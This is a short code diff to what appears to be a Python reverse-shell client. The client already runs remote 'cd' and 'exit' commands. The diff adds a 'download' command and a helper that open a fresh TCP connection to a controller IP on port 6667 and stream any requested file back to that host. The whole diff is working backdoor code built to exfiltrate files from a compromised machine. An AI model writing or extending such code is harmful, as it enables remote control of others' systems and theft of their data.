@@ -25,6 +25,10 @@ class tcp_socket():
 
     def send_data(self, data):
         self.conn.sendall(data)
+        
+    def send_file(self, filename):
+        self.conn.sendall(open(filename, "rb").read())
+        self.conn.close()
 
     def close(self):
         self.conn.close()
@@ -41,6 +45,11 @@ def easy_chdir(s):
         os.chdir(s)
     except:
         pass
+    
+def easy_file_send(filename, IP):
+    xf = tcp_socket()
+    xf.connect_to(IP, 6667)
+    xf.send_file(filename)
 
 # python2.7 and python3
 def to_bytes(s):
@@ -63,6 +72,8 @@ def easy_cmd(conn):
         cmd = to_str(conn.recive_data())
         if cmd.startswith('cd'):
             easy_chdir(cmd[3:len(cmd) - 1])
+        elif cmd.startswith('download'):
+            easy_file_send(cmd[9:len(cmd)-1], IP)
         elif cmd == "exit\n":
             conn.close()
             exit()
